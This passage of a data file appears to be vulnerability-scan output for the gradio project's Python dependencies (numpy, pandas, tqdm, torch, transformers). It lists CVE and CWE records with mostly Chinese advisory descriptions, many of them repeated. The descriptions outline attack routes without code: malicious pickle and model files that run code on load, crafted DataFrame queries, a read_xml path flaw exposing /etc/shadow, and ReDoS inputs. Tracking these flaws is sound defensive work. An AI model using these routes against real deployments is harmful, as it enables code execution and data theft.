NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,tqdm,,True,CVE-2016-10075,CWE-17,2016-12-25,"tqdm是一个快速、可扩展的Python进度条，它支持在Python长循环中添加一个进度提示信息。
tqdm 4.4.1版本和4.10版本中的tqdm._version模块存在安全漏洞。本地攻击者可利用该漏洞执行任意代码。",2,0
gradio-app_gradio,tqdm,,True,CVE-2024-34062,CWE-74,2024-05-03,"tqdm是tqdm开源的一个用于 Python 和 CLI 的快速、可扩展的进度条。
tqdm 4.66.3之前版本存在安全漏洞，该漏洞源于任何可选的非布尔 CLI 参数都可以通过 python 的 eval传递，允许任意代码执行。",3,0
gradio-app_gradio,tqdm,,True,CVE-2016-10075,CWE-17,2016-12-25,"tqdm是一个快速、可扩展的Python进度条，它支持在Python长循环中添加一个进度提示信息。
tqdm 4.4.1版本和4.10版本中的tqdm._version模块存在安全漏洞。本地攻击者可利用该漏洞执行任意代码。",2,0
gradio-app_gradio,tqdm,,True,CVE-2024-34062,CWE-74,2024-05-03,"tqdm是tqdm开源的一个用于 Python 和 CLI 的快速、可扩展的进度条。
tqdm 4.66.3之前版本存在安全漏洞，该漏洞源于任何可选的非布尔 CLI 参数都可以通过 python 的 eval传递，允许任意代码执行。",3,0
gradio-app_gradio,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
gradio-app_gradio,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
gradio-app_gradio,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
gradio-app_gradio,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
gradio-app_gradio,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,transformers,,True,,CWE-601,2022-11-01,"## Overview
[transformers](https://pypi.org/project/transformers) is a State-of-the-art Machine Learning for JAX, PyTorch and TensorFlow

Affected versions of this package are vulnerable to Open Redirect due to referencing an obsolete link.
## Remediation
Upgrade `transformers` to version 4.23.0 or higher.
## References
- [GitHub Commit](https://github.com/huggingface/transformers/commit/ce2620194b4a8f070cd29504d34a79758affdf95)
- [GitHub PR](https://github.com/huggingface/transformers/pull/19001)
- [GitHub Release](https://github.com/huggingface/transformers/releases/tag/v4.23.0)
",3,0
gradio-app_gradio,transformers,,True,CVE-2023-2800,CWE-377,,Hugging Face Transformers 是用于 JAX、PyTorch 和 TensorFlow 的先进自然语言处理库。该漏洞出现在 4.30.0 之前的版本中，源于使用过时的 tempfile.mktemp() 方法。该方法不安全，因为在调用 mktemp() 与文件创建之间，可能有其他进程创建同名文件。这可能导致文件可用性受干扰，并可能导致敏感信息泄露。,3,1
gradio-app_gradio,transformers,,True,CVE-2023-6730,CWE-502,,Hugging Face Transformers 是为 JAX、PyTorch 和 TensorFlow 提供的先进自然语言处理框架。此组件用于处理自然语言任务，如文本分类、翻译和问答系统等。漏洞发生在 Transformers 4.36.0 之前的版本，其 root cause 是在 `RagRetriever.from_pretrained()` 函数中，`index_name` 和 `index_path` 参数会反序列化不受信任的数据，攻击者可以远程加载恶意 pickle 文件，从而绕过文件检查并在主机上执行任意代码。反序列化是将字节序列转换为对象的过程，被用于通信和存储。此漏洞允许攻击者在未验证数据合法性的情况下进行反序列化，导致代码执行。,1,1
gradio-app_gradio,transformers,,True,CVE-2023-7018,CWE-502,,Hugging Face Transformers是一个用于JAX、PyTorch和TensorFlow的先进自然语言处理库。在受到影响的版本中，使用TransfoXLTokenizer()函数可能会自动加载恶意的vocab.pkl文件，利用pickle.load函数反序列化不受信任的数据。此漏洞源于未能充分验证反序列化的数据，使攻击者可执行任意代码，控制应用程序的状态或执行流程。,1,1
gradio-app_gradio,transformers,,True,CVE-2024-3568,CWE-502,,Hugging Face Transformers 是一个为 Jax、PyTorch 和 TensorFlow 打造的用于先进自然语言处理的库。TFPreTrainedModel 类的 load_repo_checkpoint() 函数存在反序列化不受信任数据的漏洞。该漏洞允许攻击者通过构造恶意的序列化有效负载，利用函数中的 pickle.load() 方法在处理来自可能不受信任源的数据时执行任意代码和命令。这种不安全反序列化的根本原因是缺少对输入数据的信任边界控制，以及对来源不明数据的直接反序列化处理。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-3933,CWE-1333,2025-07-11,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.50.3及之前版本存在安全漏洞，该漏洞源于DonutProcessor类的token2json方法存在正则表达式拒绝服务，可能导致服务中断。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3263,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于transformers.configuration_utils模块中get_configuration_file函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3777,CWE-20,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0及之前版本存在输入验证错误漏洞，该漏洞源于image_utils.py中URL验证不足，可能导致钓鱼攻击。",3,0
gradio-app_gradio,transformers,,True,CVE-2025-3264,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于dynamic_module_utils.py中get_imports函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-5197,CWE-1333,2025-08-06,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.51.3及之前版本存在安全漏洞，该漏洞源于正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-6921,CWE-400,2025-09-23,<p>transformers是Hugging Face开源的一个用于机器学习的应用程序。 transformers 4.53.0之前版本存在资源管理错误漏洞，该漏洞源于_do_use_weight_decay方法处理用户控制的正则表达式时存在缺陷，可能导致正则表达式拒绝服务攻击。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11394,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的自然语言处理框架。该框架提供构建和应用 Transformer 模型的丰富工具。在其模型文件处理过程中，由于缺乏对用户提供数据的充分验证，导致存在不安全反序列化漏洞，攻击者可以通过插入特制的未验证模型文件进行反序列化，进而在应用中执行任意代码。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-12720,CWE-1333,2025-03-20,Hugging Face Transformers 是一个开源的自然语言处理库，广泛应用于构建和训练先进的模型。该库支持 Jax、PyTorch 和 TensorFlow 的集成。在 tokenization_nougat_fast.py 文件中的 post_process_single() 函数存在正则表达式的处理漏洞。此漏洞由于正则表达式在特定条件下表现出指数时间复杂性，导致出现过度回溯，从而造成 CPU 使用率过高以及应用程序潜在的停机，形成拒绝服务 (DoS) 的场景。受影响的版本是 v4.46.3。,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11392,CWE-502,2024-11-22,Hugging Face Transformers 是一个开源项目，提供 Jax、PyTorch 和 TensorFlow 的自然语言处理模型库。其主要用于构建和训练深度学习模型以及处理自然语言数据。在处理配置文件时，因数据验证不当，导致可能不受信任的数据被反序列化。此漏洞的核心是缺乏对用户输入数据的充分验证，从而使得攻击者能够控制程序执行流，仅需用户访问恶意页面或打开恶意配置文件即可触发。该漏洞允许嵌入恶意代码执行，并在应用环境中获得与当前用户相同的权限。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-11393,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的先进自然语言处理库，提供各种预训练模型以支持多种自然语言处理任务。漏洞存在于模型文件解析过程中，因缺乏对用户输入数据的充分验证，导致不受信任的数据被反序列化。攻击者能利用该漏洞在受影响的安装上以当前用户权限执行任意代码。此漏洞主要影响版本低于4.48.0的转换脚本，但不影响核心库功能。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-1194,CWE-1333,2025-04-29,Hugging Face Transformers 是一个用于自然语言处理的开源库，提供了多种预训练模型以便于开发者快速构建机器学习应用。该漏洞存在于 GPT-NeoX-Japanese 模型的 `tokenization_gpt_neox_japanese.py` 文件中，具体是在 SubWordJapaneseTokenizer 类中。当正则表达式处理经过精心构造的输入时，会导致漏洞产生。根本原因在于某些条件下的正则表达式表现出指数复杂性，导致过度回溯。这可能导致 CPU 使用率升高，进而造成应用程序停机，有效地生成拒绝服务 (DoS) 场景。受影响的版本为 v4.48.1（最新）。,3,2
gradio-app_gradio,transformers,,True,CVE-2025-2099,CWE-1333,2025-05-19,<p>在huggingface/transformers版本v4.48.3的`transformers.testing_utils`模块中，`preprocess_string()`函数存在一个漏洞。该漏洞允许通过正则表达式拒绝服务（ReDoS）攻击进行利用。处理文档字符串中代码块所使用的正则表达式包含嵌套量词，导致在处理含有大量换行符的输入时发生指数级回溯。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2025-6638,CWE-1333,2025-09-12,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.52.4版本存在安全漏洞，该漏洞源于MarianTokenizer的remove_language_code方法存在正则表达式处理效率问题，可能导致正则表达式拒绝服务。",3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个支持多种任务的开源自然语言处理库，基于PyTorch和TensorFlow构建。由于在GitHub Actions工作流的分支名称未正确清理，攻击者可以利用此漏洞实现任意代码注入。当攻击者提供特制的分支名称时，可以触发不受信任的命令执行。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>HuggingFace Transformers 是一个用于自然语言处理和机器学习的开源库，提供各种工具和模型以简化开发。该库中的 load_tool 功能允许从 HuggingFace Hub 加载外部工具，但存在远程代码执行漏洞。攻击者可以在未启用 `Trust Remote Code` 的情况下，通过从恶意构建的库加载工具，导致执行任意 Python 代码。此漏洞的调用链为 `load_tool() -&gt; Tool.from_hub() -&gt; get_class_from_dynamic_module() -&gt; get_class_in_module() -&gt; importlib.import_module(module_path)`，其中的 importlib.import_module 函数在没有任何警告的情况下执行导入操作。</p>,3,1
